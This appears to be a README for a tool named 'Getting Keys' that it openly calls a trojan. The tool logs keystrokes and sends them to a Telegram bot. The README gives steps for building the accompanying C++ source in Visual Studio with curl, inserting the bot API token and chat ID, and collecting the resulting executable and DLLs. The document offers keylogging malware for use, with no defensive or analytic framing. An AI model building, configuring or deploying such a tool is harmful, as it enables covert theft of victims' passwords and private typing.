# Getting Keys
A simple trojan with sending keystrokes to a telegram bot. First you must have **vcpkg** and **curl** installed. 

Next, create an empty console project in Visual Studio. Move the *GettingKeys.cpp* file to the project, namely to the *Source Files* folder.

Then in the *GettingKeys.cpp* file instead of **YOUR_BOT_API** we must insert the API of our bot. I want to point out that we should insert exactly instead of it. Also do and with **YOUR_CHAT_ID**, we must enter the ID of your chat with the bot.

Then build our project as Release. Find our built .exe file together with *libcurl.dll* and *zlib1.dll*.

We can copy these files to a separate folder for convenience.
